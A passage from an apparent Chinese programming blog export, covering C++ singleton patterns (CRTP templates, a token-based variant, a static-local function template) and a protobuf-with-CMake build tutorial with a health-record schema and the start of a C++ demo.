<code>ret_singleton</code> 的方法，可以返回一个全局（静态）变量，起到类似单例的效果，这要求用户必须保证想要获取 全局变量A ，只通过 ret_singleton() 的方法。</p><p>以上是各种方法实现单例的代码和说明，解释了各种技术实现的初衷和原因。这里会<strong>比较推荐 C++11 标准下的  2.2.3 的方式</strong>，即<strong>使用 static local 的方法</strong>，简单的理由来说是因为其足够简单却满足所有需求和顾虑。</p><p>在某些情况下，我们系统中可能有多个单例，如果都按照这种方式的话，实际上是一种重复，有没有什么方法可以只实现一次单例而能够复用其代码从而实现多个单例呢？ 很自然的我们会考虑使用模板技术或者继承的方法：</p><h3 id="单例的模板"><a href="#单例的模板" class="headerlink" title="单例的模板"></a>单例的模板</h3><h4 id="CRTP-奇异递归模板模式实现"><a href="#CRTP-奇异递归模板模式实现" class="headerlink" title="CRTP 奇异递归模板模式实现"></a>CRTP 奇异递归模板模式实现</h4><p>代码示例如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// brief: a singleton base class offering an easy way to create singleton</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> T&amp; <span class="title">get_instance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">static</span> T instance;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Singleton</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;destructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Singleton</span>(<span class="keyword">const</span> Singleton&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">    Singleton&amp; <span class="keyword">operator</span> =(<span class="keyword">const</span> Singleton&amp;)=<span class="keyword">delete</span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="built_in">Singleton</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;constructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/********************************************/</span></span><br><span class="line"><span class="comment">// Example:</span></span><br><span class="line"><span class="comment">// 1.friend class declaration is requiered!</span></span><br><span class="line"><span class="comment">// 2.constructor should be private</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedSingle</span>:</span><span class="keyword">public</span> Singleton&lt;DerivedSingle&gt;&#123;</span><br><span class="line">   <span class="comment">// !!!! attention!!!</span></span><br><span class="line">   <span class="comment">// needs to be friend in order to</span></span><br><span class="line">   <span class="comment">// access the private constructor/destructor</span></span><br><span class="line">   <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span>&lt;</span>DerivedSingle&gt;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="built_in">DerivedSingle</span>(<span class="keyword">const</span> DerivedSingle&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">   DerivedSingle&amp; <span class="keyword">operator</span> =(<span class="keyword">const</span> DerivedSingle&amp;)= <span class="keyword">delete</span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   <span class="built_in">DerivedSingle</span>()=<span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    DerivedSingle&amp; instance1 = DerivedSingle::<span class="built_in">get_instance</span>();</span><br><span class="line">    DerivedSingle&amp; instance2 = DerivedSingle::<span class="built_in">get_instance</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上实现一个单例的模板基类，使用方法如例子所示意，子类需要<strong>将自己作为模板参数 T</strong> 传递给 <code>Singleton&lt;T&gt;</code> 模板；同时需要<strong>将基类声明为友元</strong>，这样才能调用子类的私有构造函数。</p><p>基类模板的实现要点是：</p><ol><li>构造函数需要是 <strong>protected</strong>，这样子类才能继承；</li><li>使用了<a href="https://en.wikipedia.org/wiki/Curiously_recurring_template_pattern">奇异递归模板模式</a> CRTP(Curiously recurring template pattern)；</li><li>get instance 方法和 magic static 懒汉式单例中的 static local 方法一个原理；</li><li>在这里基类的析构函数可以不需要 virtual ，因为子类在应用中只会用 Derived 类型，保证了析构时和构造时的类型一致。</li></ol><h4 id="不需要在子类声明友元的实现方法"><a href="#不需要在子类声明友元的实现方法" class="headerlink" title="不需要在子类声明友元的实现方法"></a>不需要在子类声明友元的实现方法</h4><p>在 <a href="https://codereview.stackexchange.com/questions/173929/modern-c-singleton-template">stackoverflow</a> 上，有大神给出了<strong>不需要在子类中声明友元的方法</strong>，在这里一并放出；精髓在于使用一个代理类 token，子类构造函数需要传递 token 类才能构造，但是把 token 保护其起来，然后子类的构造函数就可以是公有的了，这个子类只有 <code>Derived(token)</code> 的这样的构造函数，这样用户就无法自己定义一个类的实例了，起到控制其唯一性的作用。代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// brief: a singleton base class offering an easy way to create singleton</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> T&amp; <span class="title">get_instance</span><span class="params">()</span> <span class="title">noexcept</span><span class="params">(std::is_nothrow_constructible&lt;T&gt;::value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">static</span> T instance&#123;<span class="built_in">token</span>()&#125;;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Singleton</span>() =<span class="keyword">default</span>;</span><br><span class="line">    <span class="built_in">Singleton</span>(<span class="keyword">const</span> Singleton&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">    Singleton&amp; <span class="keyword">operator</span> =(<span class="keyword">const</span> Singleton&amp;)=<span class="keyword">delete</span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">token</span>&#123;</span>&#125;; <span class="comment">// helper class</span></span><br><span class="line">    <span class="built_in">Singleton</span>() <span class="keyword">noexcept</span>=<span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/********************************************/</span></span><br><span class="line"><span class="comment">// Example:</span></span><br><span class="line"><span class="comment">// constructor should be public because protected `token` control the access</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedSingle</span>:</span><span class="keyword">public</span> Singleton&lt;DerivedSingle&gt;&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="built_in">DerivedSingle</span>(token)&#123;</span><br><span class="line">       std::cout&lt;&lt;<span class="string">&quot;destructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   ~<span class="built_in">DerivedSingle</span>()&#123;</span><br><span class="line">       std::cout&lt;&lt;<span class="string">&quot;constructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">DerivedSingle</span>(<span class="keyword">const</span> DerivedSingle&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">   DerivedSingle&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> DerivedSingle&amp;)= <span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    DerivedSingle&amp; instance1 = DerivedSingle::<span class="built_in">get_instance</span>();</span><br><span class="line">    DerivedSingle&amp; instance2 = DerivedSingle::<span class="built_in">get_instance</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="函数模板返回引用"><a href="#函数模板返回引用" class="headerlink" title="函数模板返回引用"></a>函数模板返回引用</h4><p>在函数返回引用小节中提供了一种类型的全局变量的方法，可以把一个一般的类，通过这种方式提供一个类似单例的全局性效果（但是不能阻止用户自己声明定义这样的类的对象）；在这里我们把这个方法变成一个 template 模板函数，然后就可以得到任何一个类的全局变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>() &#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;constructor&quot;</span> &lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">A</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;destructor&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T&amp; <span class="title">get_global</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> T instance;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A&amp; instance_1 = get_global&lt;A&gt;();</span><br><span class="line">    A&amp; instance_2 = get_global&lt;A&gt;();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这种方式确实非常简洁，同时类仍然具有一般类的特点而不受限制，当然也因此失去了单例那么强的约束（禁止赋值、构造和拷贝构造）。<br>这里把函数命名为 <code>get_global()</code> 是为了强调，这里可以通过这种方式获取得到单例最重要的全局变量特性；但是并不是单例的模式。</p><hr><h2 id="何时应该使用或者不使用单例"><a href="#何时应该使用或者不使用单例" class="headerlink" title="何时应该使用或者不使用单例"></a>何时应该使用或者不使用单例</h2><p>根据 stackoverflow 上的一个高票答案 <a href="https://stackoverflow.com/questions/86582/singleton-how-should-it-be-used">singleton-how-should-it-be-used</a>：</p><blockquote><p>You need to have one and only one object of a type in system<br><strong>你需要系统中只有唯一一个实例存在的类的全局变量的时候才使用单例</strong>。</p></blockquote><p>如果使用单例，应该用什么样子的：</p><blockquote><p>How to create the best singleton:</p><ul><li>The smaller, the better. I am a minimalist</li><li>Make sure it is thread safe</li><li>Make sure it is never null</li><li>Make sure it is created only once</li><li>Lazy or system initialization? Up to your requirements</li><li>Sometimes the OS or the JVM creates singletons for you (e.g. in Java every class definition is a singleton)</li><li>Provide a destructor or somehow figure out how to dispose resources</li><li>Use little memory<br>越小越好，越简单越好，线程安全，内存不泄露</li></ul></blockquote><p>当然程序员是分流派的，有些是反对单例的，有些人是反对设计模式的，有些人甚至连面向对象都反对。</p><hr><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>在本文写作的过程中参考了一些博客和 stackoverflow 的回答，以超链接的方式体现在文中。另外还有一些我觉得非常精彩的回答，放在下面供读者拓展阅读</p><p>推荐阅读：</p><ol><li>高票回答中提供了一系列有益的链接(<a href="https://stackoverflow.com/questions/1008019/c-singleton-design-pattern/1008289#1008289">https://stackoverflow.com/questions/1008019/c-singleton-design-pattern/1008289#1008289</a>)</li><li>面试中的单例(<a href="http://www.cnblogs.com/loveis715/archive/2012/07/18/2598409.html">http://www.cnblogs.com/loveis715/archive/2012/07/18/2598409.html</a>)</li><li>一些观点(<a href="https://segmentfault.com/q/1010000000593968">https://segmentfault.com/q/1010000000593968</a>)</li></ol>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>protobuf + CMake 初体验</title>
      <link href="/2022/02/25/tools-protobuf/"/>
      <url>/2022/02/25/tools-protobuf/</url>
      
        <content type="html"><![CDATA[<h1 id="先利用-CMake-从源代码构建编译-protobuf"><a href="#先利用-CMake-从源代码构建编译-protobuf" class="headerlink" title="先利用 CMake 从源代码构建编译 protobuf"></a>先利用 CMake 从源代码构建编译 protobuf</h1><p>首先保证自己的操作系统下已经安装好了 mingw 和 cmake，并且都加入到了系统 path。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载 protobuf 的源代码</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/protocolbuffers/protobuf.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> protobuf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir cmakeBuild</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> cmakeBuild</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CMakeList 存放在 protobuf/cmake 目录下</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 我们将其安装在 C 盘（因为我的 C 盘是固态，所以我一般把软件安在这）</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cmake -DCMAKE_BUILD_TYPE=Release -Dprotobuf_BUILD_TESTS=OFF -G <span class="string">&quot;MinGW Makefiles&quot;</span> -DCMAKE_INSTALL_PREFIX=<span class="string">&quot;C:/Program Files/protobuf&quot;</span> ../cmake</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mingw32-make.exe -j12</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mingw32-make.exe install</span></span><br></pre></td></tr></table></figure><p>在执行上述命令后，则将 Release 版本的 protobuf 安装在目录 <code>C:/Program Files/protobuf</code> 下了，接下来就可以在我们 CMake 管理的项目中使用它。</p><hr><h1 id="将-protobuf-导入到-cmake-管理的项目"><a href="#将-protobuf-导入到-cmake-管理的项目" class="headerlink" title="将 protobuf 导入到 cmake 管理的项目"></a>将 protobuf 导入到 cmake 管理的项目</h1><p>在 protobuf 编译安装好之后，在后续的使用过程中为了将其导入到 CMake 管理的项目中，最重要的是写 CMakeList。假设现在我们的数据格式定义在文件 healthMonitoring.proto 中，通过如下的 CMakeLists 脚本则可以实现功能，其中 <code>PROTOBUF_ROOT</code>  表示 protobuf 安装目录前缀，可以通过 CMake 的参数指定。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在指定的 PROTOBUF_ROOT 目录下寻找 protobuf</span></span><br><span class="line"><span class="keyword">set</span>(Protobuf_USE_STATIC_LIBS <span class="keyword">ON</span>)</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$&#123;PROTOBUF_ROOT&#125;</span>/lib/cmake/protobuf/protobuf-config.cmake)</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$&#123;PROTOBUF_ROOT&#125;</span>/lib/cmake/protobuf/protobuf-module.cmake)</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$&#123;PROTOBUF_ROOT&#125;</span>/lib/cmake/protobuf/protobuf-options.cmake)</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$&#123;PROTOBUF_ROOT&#125;</span>/lib/cmake/protobuf/protobuf-targets.cmake)</span><br><span class="line"><span class="keyword">find_package</span>(Protobuf REQUIRED HINTS <span class="variable">$&#123;PROTOBUF_ROOT&#125;</span>/lib/cmake/protobuf)</span><br><span class="line"><span class="keyword">if</span> (Protobuf_FOUND)</span><br><span class="line">    <span class="keyword">message</span>(STATUS <span class="string">&quot;Protobuf version : $&#123;Protobuf_VERSION&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">message</span>(STATUS <span class="string">&quot;Protobuf include path : $&#123;Protobuf_INCLUDE_DIRS&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">message</span>(STATUS <span class="string">&quot;Protobuf libraries : $&#123;Protobuf_LIBRARIES&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">message</span>(STATUS <span class="string">&quot;Protobuf compiler libraries : $&#123;Protobuf_PROTOC_LIBRARIES&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">message</span>(STATUS <span class="string">&quot;Protobuf lite libraries : $&#123;Protobuf_LITE_LIBRARIES&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> ()</span><br><span class="line">    <span class="keyword">message</span>(WARNING <span class="string">&quot;Protobuf package not found -&gt; specify search path via PROTOBUF_ROOT variable&quot;</span>)</span><br><span class="line"><span class="keyword">endif</span> ()</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;Protobuf_INCLUDE_DIRS&#125;</span>)</span><br><span class="line"><span class="comment"># 下述生成的 .pb.h 和 .pb.cc 文件会存放在当前正在编译的二进制文件所存放的目录下</span></span><br><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;CMAKE_CURRENT_BINARY_DIR&#125;</span>)</span><br><span class="line"><span class="comment"># protobuf 自定义的 cmake 函数，用来调用 protoc 编译器生成对应的 .pb.h .pb.cc 文件，其中 PROTO_SRCS 和 PROTO_HDRS 分别代表生成的 .pb.cc 文件和 .pb.h 文件 </span></span><br><span class="line">protobuf_generate_cpp(PROTO_SRCS PROTO_HDRS healthMonitoring.proto)</span><br><span class="line"><span class="keyword">message</span>(STATUS <span class="string">&quot;Protobuf generated .pb.cc: $&#123;PROTO_SRCS&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">message</span>(STATUS <span class="string">&quot;Protobuf generated .pb.h: $&#123;PROTO_HDRS&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="protobuf-的-C-demo"><a href="#protobuf-的-C-demo" class="headerlink" title="protobuf 的 C++ demo"></a>protobuf 的 C++ demo</h1><p>protobuf 也算是一种语言吧，学习他最快的方式就是迅速的研读一套代码，正好最近开学学校需要统计健康码，行程码等健康状态信息，就通过制作一套 protobuf 接口来学习咯。首先编辑 .proto 文件，定义如下消息字段：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> SchoolOfComputerScience;  <span class="comment">//生成对应的命名空间，表示统计计算机学院的数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 一个人应该包含的信息字段</span></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="keyword">optional</span> <span class="built_in">string</span> name = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="built_in">int64</span> studentID = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="built_in">int64</span> phoneNumber = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   *  健康状态消息字段</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="class"><span class="keyword">message</span> <span class="title">HealthCondition</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">HealthCodeColor</span> </span>&#123;</span><br><span class="line">      RED = <span class="number">0</span>;</span><br><span class="line">      YELLOW = <span class="number">1</span>;</span><br><span class="line">      GREEN = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">optional</span> HealthCodeColor healthCode = <span class="number">1</span>;  <span class="comment">// 健康码颜色</span></span><br><span class="line">    <span class="keyword">repeated</span> <span class="built_in">string</span> routes = <span class="number">2</span>;               <span class="comment">// 行程记录</span></span><br><span class="line">    <span class="keyword">optional</span> <span class="built_in">float</span> temperature = <span class="number">3</span>;           <span class="comment">// 温度</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">optional</span> HealthCondition healthCondition = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 健康检测表，表项由人组成</span></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">HealthMonitoringTable</span> </span>&#123;</span><br><span class="line">  <span class="keyword">repeated</span> Person people = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后通过上述的 CMakeList 的就可以在我们的项目中使用该 .proto 文件生成的数据接口，使用过程如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;healthMonitoring.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dumpInfo</span><span class="params">(<span class="keyword">const</span> SchoolOfComputerScience::HealthMonitoringTable &amp;healthMonitoringTable)</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;HealthMonitoringTable as follow: \n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span 